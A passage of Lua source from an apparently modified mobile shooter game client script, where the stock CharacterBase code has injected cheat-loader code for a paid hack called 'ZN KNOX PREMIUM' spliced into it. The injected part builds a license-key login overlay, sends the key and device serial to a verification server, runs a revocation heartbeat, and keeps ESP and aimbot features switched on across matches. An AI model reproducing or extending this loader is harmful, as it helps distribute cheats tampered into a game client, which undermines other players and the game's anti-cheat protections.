            mkBorder(root, CLR.emerald, cx, cy - panelH * 0.262, panelW * 0.35, math.max(3, math.floor(4 * S)), 9999, true)
            mkBorder(root, CLR.gold, cx, cy - panelH * 0.262, math.max(6, math.floor(8 * S)), math.max(6, math.floor(8 * S)), 9999)
            -- key input row: [✒] [ textbox ] [PASTE]
            local iy, ih = cy - panelH * 0.115, 74 * S
            local rowW = panelW * 0.892
            local iconW, pasteW, rowGap = 52 * S, panelW * 0.20, 10 * S
            local boxW = rowW - iconW - pasteW - rowGap * 2
            local iconX = cx - rowW * 0.5 + iconW * 0.5
            local boxCX = cx - rowW * 0.5 + iconW + rowGap + boxW * 0.5
            local pasteCX = cx + rowW * 0.5 - pasteW * 0.5
            mkText(root, "✒", math.floor(30 * S), CLR.emerald, iconX, iy, true)
            local inputBg = safeNew("/Script/UMG.Border", root)
            if inputBg and slua.isValid(inputBg) then
                pcall(function()
                    inputBg:SetBrushColor(CLR.input_bg)
                    inputBg:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
                end)
                local ibs = nil
                pcall(function() ibs = root:AddChildToCanvas(inputBg) end)
                if ibs then pcall(function() ibs:SetAlignment(FVector2D(0.5, 0.5)) ibs:SetPosition(FVector2D(boxCX, iy)) ibs:SetSize(FVector2D(boxW + 10, 74 * S)) ibs:SetZOrder(9997) end) end
            end
            local frameThickness = math.max(3, math.floor(4 * S))
            mkBorder(root, CLR.emerald_dim, boxCX, iy - ih * 0.5, boxW + 10, frameThickness, 9999, true)
            mkBorder(root, CLR.emerald_dim, boxCX, iy + ih * 0.5, boxW + 10, frameThickness, 9999, true)
            mkBorder(root, CLR.emerald_dim, boxCX - (boxW + 10) * 0.5, iy, frameThickness, ih, 9999, true)
            mkBorder(root, CLR.emerald_dim, boxCX + (boxW + 10) * 0.5, iy, frameThickness, ih, 9999, true)
            local box = safeNew("/Script/UMG.EditableTextBox", root)
            if box and slua.isValid(box) then
                local bs = nil
                pcall(function() bs = root:AddChildToCanvas(box) end)
                if bs then pcall(function() bs:SetAlignment(FVector2D(0.5, 0.5)) bs:SetPosition(FVector2D(boxCX, iy)) bs:SetSize(FVector2D(boxW, 56 * S)) bs:SetZOrder(9999) end) end
                pcall(function() if box.SetHintText then box:SetHintText("© ENTER ACCESS KEY") end end)
                pcall(function() if box.SetKeyboardFocus then box:SetKeyboardFocus() end end)
                pcall(function()
                    if box.SetForegroundColor then
                        if FSlateColor then box:SetForegroundColor(FSlateColor(CLR.emerald)) else box:SetForegroundColor(CLR.emerald) end
                    end
                end)
                _G._LOGIN_BOX = box
            else
                return
            end
            mkText(root, topMsg or "» Enter your key to unlock premium", math.floor(18 * S), FLinearColor(0.70, 0.95, 0.78, 1.0), cx, cy - panelH * 0.005)
            _G._LOGIN_BTN_LABELS = _G._LOGIN_BTN_LABELS or {}
            local function mkButton(bcx, by, bw, bh, label, lr, lg, lb, fontSize)
                local b = safeNew("/Script/UMG.Button", root)
                if not (b and slua.isValid(b)) then return nil end
                local bs2 = nil
                pcall(function() bs2 = root:AddChildToCanvas(b) end)
                if bs2 then pcall(function() bs2:SetAlignment(FVector2D(0.5, 0.5)) bs2:SetPosition(FVector2D(bcx, by)) bs2:SetSize(FVector2D(bw, bh)) bs2:SetZOrder(9999) end) end
                local l = safeNew("/Script/UMG.TextBlock", b)
                if l and slua.isValid(l) then
                    pcall(function()
                        l:SetText(label)
                        local lc = FLinearColor(lr, lg, lb, 1)
                        if FSlateColor then l:SetColorAndOpacity(FSlateColor(lc)) else l:SetColorAndOpacity(lc) end
                        if l.Font then local f2 = l.Font f2.Size = fontSize or math.floor(24 * S) pcall(function() f2.TypefaceFontName = "Bold" end) l.Font = f2 end
                        pcall(function() l:SetShadowColorAndOpacity(FLinearColor(0, 0, 0, 0.9)) end)
                        pcall(function() l:SetShadowOffset(FVector2D(1.5, 1.5)) end)
                        l:SetWidgetVisibility(UEnums.ESlateVisibility.HitTestInvisible)
                    end)
                    pcall(function() if b.AddChild then b:AddChild(l) end end)
                    _G._LOGIN_BTN_LABELS[b] = { label = l, r = lr, g = lg, b = lb }
                end
                return b
            end
            local function BindHover(b, hr, hg, hb)
                if not (b and slua.isValid(b)) then return end
                local function setHL(on)
                    pcall(function()
                        local rec = _G._LOGIN_BTN_LABELS and _G._LOGIN_BTN_LABELS[b]
                        if rec and rec.label and slua.isValid(rec.label) then
                            local c = on and FLinearColor(hr, hg, hb, 1) or FLinearColor(rec.r, rec.g, rec.b, 1)
                            if FSlateColor then rec.label:SetColorAndOpacity(FSlateColor(c)) else rec.label:SetColorAndOpacity(c) end
                        end
                        if on and b.SetColorAndOpacity then b:SetColorAndOpacity(FLinearColor(1.5, 1.5, 1.5, 1.0)) end
                        if (not on) and b.SetColorAndOpacity then b:SetColorAndOpacity(FLinearColor(1.0, 1.0, 1.0, 1.0)) end
                    end)
                end
                pcall(function() if b.OnHovered and b.OnHovered.Add then b.OnHovered:Add(function() setHL(true) end) end end)
                pcall(function() if b.OnUnhovered and b.OnUnhovered.Add then b.OnUnhovered:Add(function() setHL(false) end) end end)
            end
            local function glowBehind(bx, by, bw, bh, color, z)
                pcall(function()
                    local gb = safeNew("/Script/UMG.Border", root)
                    if gb and slua.isValid(gb) then
                        gb:SetBrushColor(color)
                        gb:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
                        local gs2 = root:AddChildToCanvas(gb)
                        if gs2 then gs2:SetAlignment(FVector2D(0.5, 0.5)) gs2:SetPosition(FVector2D(bx, by)) gs2:SetSize(FVector2D(bw + 10, bh + 10)) gs2:SetZOrder(z or 9997) end
                        if ANIM.bars then table.insert(ANIM.bars, gb) end
                    end
                end)
            end
            -- PASTE button
            _G._PASTE_BTN = mkButton(pasteCX, iy, pasteW, 56 * S, "✁ PASTE", 1.0, 0.85, 0.30)
            if _G._PASTE_BTN then
                pcall(function() if _G._PASTE_BTN.SetColorAndOpacity then _G._PASTE_BTN:SetColorAndOpacity(FLinearColor(0.55, 0.55, 0.55, 1.0)) end end)
                BindHover(_G._PASTE_BTN, 1.0, 0.90, 0.40)
                BindClick(_G._PASTE_BTN, function()
                    local k = GetSavedKey()
                    if k and _G._LOGIN_BOX and slua.isValid(_G._LOGIN_BOX) then
                        pcall(function() _G._LOGIN_BOX:SetText(tostring(k)) end)
                        SetLoginStatus("Saved key pasted - press LOGIN", false)
                    else
                        SetLoginStatus("No saved key found", true)
                    end
                end)
            end
            local getkeyX, loginX, btnW, btnH = cx - panelW * 0.165, cx + panelW * 0.165, panelW * 0.311, 62 * S
            local btnY = cy + panelH * 0.115
            -- GET KEY button (gold outline style)
            _G._GETKEY_BTN = mkButton(getkeyX, btnY, btnW, btnH, "★ GET KEY", 1.0, 0.85, 0.30)
            if _G._GETKEY_BTN then
                pcall(function() if _G._GETKEY_BTN.SetColorAndOpacity then _G._GETKEY_BTN:SetColorAndOpacity(FLinearColor(0.50, 0.50, 0.50, 1.0)) end end)
                glowBehind(getkeyX, btnY, btnW, btnH, FLinearColor(1.0, 0.82, 0.25, 0.55), 9997)
                BindHover(_G._GETKEY_BTN, 1.0, 0.95, 0.50)
            end
            -- LOGIN button (emerald filled, animated glow)
            _G._LOGIN_BTN = mkButton(loginX, btnY, btnW, btnH, "❝LOGIN❞", 1.0, 1.0, 1.0)
            if _G._LOGIN_BTN then
                pcall(function() if _G._LOGIN_BTN.SetColorAndOpacity then _G._LOGIN_BTN:SetColorAndOpacity(FLinearColor(0.35, 1.45, 0.65, 1.0)) end end)
                glowBehind(loginX, btnY, btnW, btnH, FLinearColor(0.10, 1.0, 0.45, 0.75), 9997)
                mkBorder(root, CLR.gold, loginX, btnY - btnH * 0.5 - 2, btnW + 12, math.max(2, math.floor(3 * S)), 9996)
                mkBorder(root, CLR.gold, loginX, btnY + btnH * 0.5 + 2, btnW + 12, math.max(2, math.floor(3 * S)), 9996)
                BindHover(_G._LOGIN_BTN, 1.0, 1.0, 1.0)
            end
            -- ============ STATUS PILL ============
            pcall(function()
                local pill = safeNew("/Script/UMG.Border", root)
                if pill and slua.isValid(pill) then
                    pill:SetBrushColor(FLinearColor(0.02, 0.08, 0.05, 0.96))
                    pill:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
                    local ps = root:AddChildToCanvas(pill)
                    if ps then ps:SetAlignment(FVector2D(0.5, 0.5)) ps:SetPosition(FVector2D(cx, cy + panelH * 0.222)) ps:SetSize(FVector2D(panelW * 0.68, 42 * S)) ps:SetZOrder(9998) end
                    _G._LOGIN_PILL = pill
                    mkBorder(root, CLR.emerald_dim, cx, cy + panelH * 0.222, panelW * 0.68, math.max(2, math.floor(3 * S)), 9999, true)
                end
            end)
            _G._LOGIN_STATUS = mkText(root, "● SYSTEM READY", math.floor(19 * S), CLR.emerald, cx, cy + panelH * 0.222)
            -- ============ FOOTER ============
            mkText(root, "✮ ZN KNOX PREMIUM  ✿  @ZN_OWNER  ✮", math.floor(15 * S), CLR.gold, cx, cy + panelH * 0.335)
            local rs = nil
            pcall(function() rs = Parent:AddChildToCanvas(root) end)
            if rs then pcall(function() rs:SetPosition(FVector2D(0, 0)) rs:SetSize(FVector2D(pw, ph)) rs:SetZOrder(9989) end) end
            FillParent(rs)
            _G._LOGIN_ROOTSLOT = rs
            -- saare children ke slots note karo taaki relayout me shift ho sake
            _G._LOGIN_SLOTS = nil
            pcall(function()
                local t = {}
                if root and slua.isValid(root) and root.GetChildrenCount then
                    local n = root:GetChildrenCount()
                    for i = 0, n - 1 do
                        local ch = nil
                        pcall(function() ch = root:GetChildAt(i) end)
                        -- dim ko anchor-loop se bahar rakho (wo absolute + full-cover hi rahega)
                        if ch and slua.isValid(ch) and ch ~= _G._LOGIN_DIM then
                            local sl = ch.Slot
                            if not sl and ch.GetSlot then pcall(function() sl = ch:GetSlot() end) end
                            if sl then
                                pcall(function()
                                    if sl.GetPosition then
                                        local v = sl:GetPosition()
                                        if v and v.X then table.insert(t, { s = sl, x = v.X, y = v.Y }) end
                                    end
                                end)
                            end
                        end
                    end
                end
                if #t > 0 then
                    _G._LOGIN_SLOTS = t
                    _G._LOGIN_CX, _G._LOGIN_CY = cx, cy
                    -- Gravity.CENTER: engine khud center kare (har device par exact).
                    -- positions ko center-relative offset me badlo. Na lage to purana math rahega.
                    local anchored = false
                    pcall(function()
                        local s0 = t[1] and t[1].s
                        if s0 and slua.isValid(s0) and s0.SetAnchors then
                            s0:SetAnchors({ Minimum = { X = 0.5, Y = 0.5 }, Maximum = { X = 0.5, Y = 0.5 } })
                            anchored = true
                        end
                    end)
                    if anchored then
                        for _, e in ipairs(t) do
                            pcall(function()
                                if e.s.SetAnchors then e.s:SetAnchors({ Minimum = { X = 0.5, Y = 0.5 }, Maximum = { X = 0.5, Y = 0.5 } }) end
                                if e.s.SetPosition then e.s:SetPosition(FVector2D(e.x - cx, e.y - cy)) end
                            end)
                        end
                        -- ab engine sambhalega, manual relayout band
                        _G._LOGIN_SLOTS = nil
                    end
                end
            end)
            _G._LOGIN_UI = root
            -- ============ ANIMATION LOOP (pulse + scanline sweep) ============
            pcall(function()
                if _G._LOGIN_PULSE_TIMER and _G._LOGIN_PULSE_CHAR and _G._LOGIN_PULSE_CHAR.RemoveGameTimer then
                    local pc0 = _G._LOGIN_PULSE_CHAR
                    if pc0.Object and slua.isValid(pc0.Object) then pc0:RemoveGameTimer(_G._LOGIN_PULSE_TIMER) end
                end
                _G._LOGIN_PULSE_TIMER = nil
                _G._LOGIN_PULSE_ON = false
                _G._LOGIN_PULSE_CHAR = character
                if _G._LOGIN_ANIM_TIMER and _G._LOGIN_ANIM_CHAR and _G._LOGIN_ANIM_CHAR.RemoveGameTimer then
                    local oldC = _G._LOGIN_ANIM_CHAR
                    if oldC.Object and slua.isValid(oldC.Object) then pcall(function() oldC:RemoveGameTimer(_G._LOGIN_ANIM_TIMER) end) end
                end
                _G._LOGIN_ANIM_TIMER = nil
                _G._LOGIN_ANIM_CHAR = character
                -- merge old + new pulse lists so both systems glow
                if ANIM.bars then
                    _G._LOGIN_PULSE_BARS = _G._LOGIN_PULSE_BARS or {}
                    for _, b in ipairs(ANIM.bars) do table.insert(_G._LOGIN_PULSE_BARS, b) end
                    ANIM.bars = _G._LOGIN_PULSE_BARS
                end
                local FLinearColor_P = import("LinearColor")
                local bright = FLinearColor_P(0.10, 1.00, 0.45, 1.0)
                local dark = FLinearColor_P(0.04, 0.35, 0.18, 1.0)
                local animTick = 0
                local function pulseTick()
                    if not (_G._LOGIN_UI and slua.isValid(_G._LOGIN_UI)) then return end
                    animTick = animTick + 1
                    _G._LOGIN_PULSE_ON = not _G._LOGIN_PULSE_ON
                    local c = _G._LOGIN_PULSE_ON and bright or dark
                    if _G._LOGIN_PULSE_BARS then
                        for _, b in ipairs(_G._LOGIN_PULSE_BARS) do
                            pcall(function() if b and slua.isValid(b) then b:SetBrushColor(c) end end)
                        end
                    end
                    if ANIM.bars and ANIM.bars ~= _G._LOGIN_PULSE_BARS then
                        for _, b in ipairs(ANIM.bars) do
                            pcall(function() if b and slua.isValid(b) then b:SetBrushColor(c) end end)
                        end
                    end
                    -- Scanline sweep up/down
                    pcall(function()
                        local sc = ANIM.scan
                        if sc and sc.widget and slua.isValid(sc.widget) then
                            local offset = math.sin(animTick * 0.18) * sc.range
                            local sl = sc.widget.Slot
                            if not sl and sc.widget.GetSlot then pcall(function() sl = sc.widget:GetSlot() end) end
                            if sl and sl.SetPosition then sl:SetPosition(FVector2D(cx, sc.baseY + offset)) end
                        end
                    end)
                end
                _G._LOGIN_PULSE_TIMER = character:AddGameTimer(0.35, true, pulseTick)
                _G._LOGIN_ANIM_TIMER = _G._LOGIN_PULSE_TIMER
            end)
            built = true
        end)
        if not ok then
            _G._LOGIN_LAST_ERROR = tostring(err)
            pcall(function() print("[ZNLOGIN] build failed: " .. tostring(err)) end)
            -- UI phir bhi ban gaya ho to success mano (animation/timer fail se login mat roko)
            if _G._LOGIN_UI and slua.isValid(_G._LOGIN_UI) then built = true end
        end
        if not built then return false end
        local attempts = 0
        local lastText, stable = nil, 0
        local function doLoginAttempt(t)
            if _G._LOGIN_TRYING then return end
            _G._LOGIN_TRYING = true
            SetLoginStatus("Checking...", false)
            onLogin(t, function(ok, reason, expiry)
                _G._LOGIN_TRYING = false
                if ok then
                    -- direct: login ke baad turant UI band, hack seedha load (koi popup/wait nahi)
                    pcall(DestroyLoginUI)
                else
                    if reason == "nonet" or reason == "limited" then
                        -- transient fail: attempt count nahi, timer khud retry karega
                        SetLoginStatus("Net slow - retry ho raha hai...", false)
                        lastText, stable = nil, 0
                    else
                        attempts = attempts + 1
                        if reason == "invalid" then SetLoginStatus("Galat key - dobara likho", true)
                        elseif reason == "blocked" then SetLoginStatus("Key blocked hai", true)
                        elseif reason == "expired" then SetLoginStatus("Key expire ho gayi", true)
                        elseif reason == "device_limit" then SetLoginStatus("Dusre device par lock hai", true)
                        else SetLoginStatus("Net error - fir se try karo", true) end
                        if attempts >= 5 then SetLoginStatus("Seller se contact karo", true) end
                    end
                end
            end)
        end
        local function tryLoginTap()
            local t = GetInputText()
            if not t or #t < 4 then
                SetLoginStatus("Pehle key likho", true)
                return
            end
            doLoginAttempt(t)
        end
        -- LOGIN tap = turant check, GET KEY tap = telegram (best effort, timer backup hai)
        BindClick(_G._LOGIN_BTN, tryLoginTap)
        BindClick(_G._GETKEY_BTN, OpenTelegram)
        -- asli mechanism: stable text = auto verify (rate-limit safe)
        local loginTimer = nil
        loginTimer = character:AddGameTimer(1.0, true, function()
            if not slua.isValid(character.Object) then
                if loginTimer and character.RemoveGameTimer then pcall(function() character:RemoveGameTimer(loginTimer) end) end
                return
            end
            if not (_G._LOGIN_BOX and slua.isValid(_G._LOGIN_BOX)) then
                if loginTimer and character.RemoveGameTimer then pcall(function() character:RemoveGameTimer(loginTimer) end) end
                return
            end
            local t = GetInputText()
            if t and t == lastText and #t >= 4 and stable >= 0 then
                stable = stable + 1
                if stable >= 2 then
                    stable = -999
                    doLoginAttempt(t)
                end
            else
                lastText, stable = t, 0
            end
        end)
        _G._LOGIN_TIMER = loginTimer
        _G._LOGIN_CHAR = character
        return true
    end

    local function verifyLicense(character, onSuccess)
        -- isi session me verify ho chuka to dobara server mat tang karo
        if _G._LICENSE_OK then
            onSuccess()
            return
        end
        DestroyLoginUI()
        local function loginAndVerify(typedKey, cb)
            SaveKeyFile(typedKey)
            local uid = _G._LICENSE_UID or GetSerial()
            if not uid then
                cb(false, "missing", nil)
                return
            end
            DoVerifyPost(typedKey, uid, function(ok, reason, expiry)
                if ok then
                    _G._LICENSE_OK = true
                    _G._LICENSE_UID = uid
                    -- NO POPUP: login ke baad seedha hack load (fast)
                    onSuccess()
                end
                cb(ok, reason, expiry)
            end)
        end
        local function openLogin(topMsg)
            local shown = ShowLoginUI(character, topMsg, function(typedKey, cb)
                loginAndVerify(typedKey, cb)
            end)
            if not shown then
                local dbg = _G._LOGIN_LAST_ERROR and ("\nErr: " .. tostring(_G._LOGIN_LAST_ERROR):sub(1, 200)) or ""
                LicensePopup("KEY ERROR", "Login screen nahi khula.\nzn_knox.txt me key dalo:\n" .. KEY_PATH .. dbg)
            end
        end
        local userKey = GetSavedKey()
        if not userKey then
            openLogin("Type key, then press LOGIN")
            return
        end
        -- UID login ke turant baad kabhi nil hota hai, retry karo
        local tries = 0
        local uidTimer = nil
        uidTimer = character:AddGameTimer(1.0, true, function()
            if not slua.isValid(character.Object) then
                if uidTimer and character.RemoveGameTimer then pcall(function() character:RemoveGameTimer(uidTimer) end) end
                return
            end
            tries = tries + 1
            local uid = GetSerial()
            if not uid and tries < 12 then return end
            if uidTimer and character.RemoveGameTimer then pcall(function() character:RemoveGameTimer(uidTimer) end) end
            if not uid then
                openLogin("Type key, then press LOGIN")
                return
            end
            DoVerifyPost(userKey, uid, function(ok, reason, expiry)
                if ok then
                    _G._LICENSE_OK = true
                    _G._LICENSE_UID = uid
                    -- NO POPUP: login ke baad seedha hack load (fast)
                    onSuccess()
                else
                    -- galat/expire/lock key par dobara type karne ka mauka do
                    if reason == "nonet" then
                        LicenseReasonPopup(reason, expiry)
                    else
                        openLogin("Key fail - sahi key dobara likho")
                        SetLoginStatus("Pichli key: " .. tostring(reason), true)
                    end
                end
            end)
        end)
    end

    local function startHeartbeat(character)
        local hb = nil
        hb = character:AddGameTimer(180, true, function()
            if not slua.isValid(character.Object) then
                if hb and character.RemoveGameTimer then pcall(function() character:RemoveGameTimer(hb) end) end
                return
            end
            if not _G._LICENSE_OK then return end
            local userKey = GetSavedKey()
            local uid = _G._LICENSE_UID or GetSerial()
            if not userKey or not uid then return end
            DoVerifyPost(userKey, uid, function(ok, reason)
                if not ok and reason ~= "nonet" and reason ~= "limited" then
                    _G._LICENSE_OK = false
                    LicensePopup("LICENSE REVOKED", "Key block/expire ho gayi.\nFeatures agle match se band.")
                end
            end)
        end)
    end

    local function startModFlow()
        if _G._MOD_EXECUTED then
            pcall(restoreModSettings)
            waitForAdvancedAndStart(self)
        else
            loadMod(MODS[1].key)
        end

        self:AddGameTimer(5.0, false, function() pcall(saveModSettings) end)
        -- Watchdog: har match / har naye character par ON wale features ko wapas chipkao.
        -- Isse menu ON dikhe aur feature bhi ON rahe, off-on dobara nahi karna padega.
        local myChar = self
        myChar:AddGameTimer(3.0, true, function()
            if not slua.isValid(myChar.Object) then return end
            -- settings continuously save taaki toggle state persist rahe
            if _G.bESP_ENABLED ~= nil or _G.bAIMBOT_ENABLED ~= nil then
                pcall(saveModSettings)
            end
            if _G._MOD_EXECUTED and _G._MOD_CHARACTER ~= myChar then
                pcall(restoreModSettings)
                if _G.ZN_Reattach then
                    pcall(_G.ZN_Reattach)
                elseif _G.StartAdvancedSystems then
                    pcall(_G.StartAdvancedSystems, myChar)
                end
                _G._MOD_CHARACTER = myChar
                _G._MAIN_LOOP_STARTED = true
            end
        end)
        if _G.ForceTPP_Enable and _G.HRD_StartForceTPP then pcall(_G.HRD_StartForceTPP) end
        startHeartbeat(myChar)
    end

    -- License gate: bina valid key ke mod load hi nahi hoga (leak bekaar)
    verifyLicense(self, startModFlow)
  end
end

function CharacterBase:_OnSmartBearerLayerVisibilityChanged(bIsHidden)
  printf("CharacterBase:_OnSmartBearerLayerVisibilityChanged %s", tostring(bIsHidden))
  local EMeshVisibleLayer = import("/Script/Engine.EMeshVisibleLayer")
  local ESkeletaTickMode = import("/Script/Engine.ESkeletaTickMode")
  local MasterMesh = self.Mesh
  if slua.isValid(MasterMesh) then
    if bIsHidden then
      MasterMesh:SetLayerVisibilityValue(EMeshVisibleLayer.VisibleLayer_2, false, false)
      MasterMesh:SetTickMode(ESkeletaTickMode.TICK_NONE)
    else
      MasterMesh:SetLayerVisibilityValue(EMeshVisibleLayer.VisibleLayer_2, true, false)
      MasterMesh:SetTickMode(ESkeletaTickMode.TICK_ALL)
    end
  end
end

function CharacterBase:ConditionChangePhysicsAsset()
  if Client then
    local uMyMesh = self.Mesh
    if slua.isValid(uMyMesh) then
      local uMyMeshPhysics = USTExtraBlueprintFunctionLibrary.GetPhysicsAssetFromMesh(uMyMesh)
      if uMyMeshPhysics == self.ShootPhysicsAsset and slua.isValid(self.ShootPhysicsAssetOpt) and uMyMesh.SetPhysicsAsset then
        uMyMesh:SetPhysicsAsset(self.ShootPhysicsAssetOpt, true)
        USTExtraBlueprintFunctionLibrary.CreatePhysicsState(uMyMesh)
        printf(string.format("CharacterBase:ReceiveBeginPlay SetPhysicsAsset"))
      end
      printf(string.format("CharacterBase:ReceiveBeginPlay GetPhysicsAssetFromMesh %s->%s)", tostring(uMyMeshPhysics), tostring(self.ShootPhysicsAsset)))
    end
  end
end

function CharacterBase:ShowDoorInteractUIIfNeed()
  local ENetRole = import("ENetRole")
  if Client and self.Role == ENetRole.ROLE_AutonomousProxy then
    self:AddGameTimer(1, false, function()
      local CapsuleComponent = self and self.CapsuleComponent
      if CapsuleComponent and slua.isValid(CapsuleComponent) then
        local ActorClass = import("/Script/Engine.Actor")
        local PUBGDoorClass = import("PUBGDoor")
        local OverlapActors = CapsuleComponent:GetOverlappingActors(slua.Array(UEnums.EPropertyClass.Object, ActorClass), PUBGDoorClass)
        if OverlapActors and OverlapActors:Num() > 0 then
          for Index = 0, OverlapActors:Num() - 1 do
            local PUBGDoor = OverlapActors:Get(Index)
            if PUBGDoor and slua.isValid(PUBGDoor) and PUBGDoor.bDoubleDoor == false and PUBGDoor.DoorBroken == false then
              local FHitResult = import("/Script/Engine.HitResult")
              local uHitResult = FHitResult()
              print(bWriteLog and "CharacterBase:ShowDoorInteractUIIfNeed, Call PUBGDoor:OnBeginOverlap")
              PUBGDoor:OnBeginOverlap(PUBGDoor.Interaction, self.Object, CapsuleComponent, -1, true, uHitResult)
            end
          end
        end
      end
    end)
  end
end

function CharacterBase:DevelopmentClientCheck()
  if slua.isValid(self.HitBox_Stand) or slua.isValid(self.HitBox_Prone) then
    local UKismetSystemLibrary = import("KismetSystemLibrary")
    if UKismetSystemLibrary.IsStandalone(slua.getGameInstance()) then
    else
      local Tips = "DevelopmentClientCheck: "
      Tips = Tips .. string.format("Character =  %s ", tostring(self.Object))
      Tips = Tips .. string.format("HitBox_Stand =  %s ", tostring(self.HitBox_Stand))
      Tips = Tips .. string.format("HitBox_Prone =  %s ", tostring(self.HitBox_Prone))
      print(bWriteLog and "CharacterBase:DevelopmentClientCheck.." .. tostring(Tips))
      self:RPC_Server_ShootVertifyFailAlarm(4, Tips)
    end
  end
end

function CharacterBase:IsAutonomousProxy()
  if CharacterBase.__super.IsAutonomousProxy(self) then
    return true
  end
  if Client and self.IsLocallyControlled and type(self.IsLocallyControlled) == "function" and self:IsLocallyControlled() then
    return true
  end
  return CharacterBase.__super.IsAutonomousProxy(self)
end

function CharacterBase:SetLastAddBuffInst(nInstID, uPawn)
  self.LastAddBuffInstID = nInstID
  self.LastAddPawn = uPawn
end

function CharacterBase:GetLastAddBuffInst()
  return self.LastAddBuffInstID, self.LastAddPawn
end

function CharacterBase:RegistAttrModifyRecordList()
end

function CharacterBase:ChangeCurrentVehicle(CurrentVehicle)
  GameplayActorData.BindSelfActor("CurrentVehicle", CurrentVehicle)
end

function CharacterBase:ChangeCurrentWeapon()
  if self.GetCurrentWeapon == nil then
    return
  end
  local uWeapon = self:GetCurrentWeapon()
  if slua.isValid(uWeapon) then
    GameplayActorData.BindSelfActor("CurrentWeapon", uWeapon)
  end
end

function CharacterBase:HandleOnClientAdjustPosition(NewLocation, Reason)
  if CGameState == nil or not slua.isValid(CGameState) then
    return
  end
  if CGameState.GetGameModeState == nil or CGameState:GetGameModeState() == "ReadyState" then
    return
  end
  local EReason = import("ECharacterMoveDragReason")
  if Reason == EReason.CMDR_ExceedsDistance and self.PlayerState and self.PlayerState.Ping then
    local bWeakNet = self.PlayerState.Ping * 4 > 250 or false
    print(bWriteLog and "CharacterBase:HandleOnClientAdjustPosition ", " Ping: ", self.PlayerState and self.PlayerState.Ping * 4 or -1)
    if bWeakNet then
      NetUtil.ShowDSTimeOutTipsUI(true, NetUtil.DSTimeOutShort)
      self:AddGameTimer(1, false, function()
        NetUtil.ShowDSTimeOutTipsUI(false, NetUtil.DSTimeOutShort)
      end)
    end
  end
end

function CharacterBase:CheckInitPlayerDSData()
  if self:IsAutonomousProxy() then
    if self.PlayerKey ~= nil and self.PlayerKey > 0 then
      self:InitPlayerDsData(self.PlayerKey)
    else
      self:AddControlEvent(self, "OnReceivePlayerKey", self.InitPlayerDsData, self)
    end
  end
end

function CharacterBase:InitPlayerDsData(nPlayerKey)
  if nPlayerKey == nil or nPlayerKey == 0 then
    print(bWriteLog and "CharacterBase InitPlayerDsData playerKey:", nPlayerKey)
    return
  end
  local PlayerEventSubsystem = SubsystemMgr:Get("PlayerEventSystem")
  if PlayerEventSubsystem then
    PlayerEventSubsystem:CheckInitDSData(nPlayerKey)
  end
end

function CharacterBase:ReceiveEndPlay(nDeltaSeconds)
  printf("CharacterBase ReceiveEndPlay() PlayerKey:%s", tostring(self.PlayerKey))
  BudgetScheduler.EvictOwner(BudgetScheduler.Channel.Init, self.Object)
  if Client then
    local SKillManager = self:GetSkillManager()
    local CheckWeaponSkillID = 1014405
    if slua.isValid(SKillManager) and SKillManager:GetCurSkillID() == CheckWeaponSkillID then
      self:StopCurrentLevelSequence()
    end
    if self.ReportCharacterStateTimer then
      self:RemoveGameTimer(self.ReportCharacterStateTimer)
      self.ReportCharacterStateTimer = nil
    end
  end
  GameplayData.UnbindPlayerCharacter(self.Object)
  if Client then
    local AvatarExceptionSubsystem = SubsystemMgr:Get("AvatarExceptionSubsystem")
    if AvatarExceptionSubsystem then
      AvatarExceptionSubsystem:UnbindPlayerCharacter(self.Object)
    end
  end
  if self.PlayerKey ~= nil and self.PlayerKey > 0 then
    EventSystem:postEvent(EVENTTYPE_PLAYEREVENT_WEAPON, EVENTID_PLAYEREVENT_WEAPON_CLEAR, self.PlayerKey)
    local PlayerEventSubsystem = SubsystemMgr:Get("PlayerEventSystem")
    if PlayerEventSubsystem then
      PlayerEventSubsystem:ClearPlayer(self.PlayerKey)
    end
  end
  self:ClearFollowEmote()
  if not self:HasAuthority() then
    self:ClearAkEventSound()
  end
  self._SuperData = nil
  if Client and self._BloodSpotDelegateHandles then
    for sName, Info in pairs(self._BloodSpotDelegateHandles) do
      if type(Info) == "table" then
        local Provider = Info.Provider
        local Handle = Info.Handle
        if Handle then
          if slua.isValid(Provider) then
            local EventDelegate = Provider.AsyncLoadParticleComponentDone
            if slua.isValid(EventDelegate) and EventDelegate.Remove then
              EventDelegate:Remove(Handle)
            else
              slua.removeDelegate(Handle)
            end
          else
            slua.removeDelegate(Handle)
          end
        end
      end
      self._BloodSpotDelegateHandles[sName] = nil
    end
    self._BloodSpotDelegateHandles = nil
  end
  CharacterBase.__super.ReceiveEndPlay(self, nDeltaSeconds)
end

function CharacterBase:GetVehicleParachuteComponent()
  if self.VehicleParachuteComponent == nil then
    local ComponentClass = import("VehicleParachuteComponent")
    self.VehicleParachuteComponent = self:GetComponentByClass(ComponentClass)
  end
  return self.VehicleParachuteComponent
end

function CharacterBase:ReceivePossessed(InController)
  if not slua.isValid(InController) then
    return
  end
  print(bWriteLog and "CharacterBase:ReceivePossessed")
  self.Super:ReceivePossessed(InController)
  local FeatureUtil = require("GameLua.Mod.BaseMod.GamePlay.Feature.Common.FeatureUtil")
  FeatureUtil.ForEachFeatureCall(self, "ReceivePossessed", InController)
  self:HandleUseGlide(InController)
  self:HandleParachuteComponent(InController)
  self:InitRevivalCount(InController)
  if not Client and not Game:IsAIController(InController) then
    self:RegistAttrModifyRecordList()
  elseif not Client and Game:IsAIController(InController) then
    self.IndoorCheckTime = 2
  end
  printf(bWriteLog and "CharacterBase:ReceivePossessed Before PlayerKey:%d NetConsiderFrequency:%f NetUpdateFrequency:%f MinNetUpdateFrequency:%f", self.PlayerKey, self.NetConsiderFrequency, self.NetUpdateFrequency, self.MinNetUpdateFrequency)
  local bBatchMove = USTExtraBlueprintFunctionLibrary.IsActorRepMovementWithBatch(self.Object)
  self:RefreshNetUpdateFrequency(bBatchMove)
  if InController and slua.isValid(InController) and InController.RefreshNetUpdateFrequency then
    InController:RefreshNetUpdateFrequency(bBatchMove)
  end
  self:AddGameTimer(5, false, function()
    if self.PlayerKey ~= nil then
      printf(bWriteLog and "CharacterBase:ReceivePossessed After PlayerKey:%d NetConsiderFrequency:%f NetUpdateFrequency:%f MinNetUpdateFrequency:%f", self.PlayerKey, self.NetConsiderFrequency, self.NetUpdateFrequency, self.MinNetUpdateFrequency)
    end
  end)
end

function CharacterBase:HandleParachuteComponent(InController)
  if slua.isValid(InController) and slua.isValid(self.ParachuteComponent) then
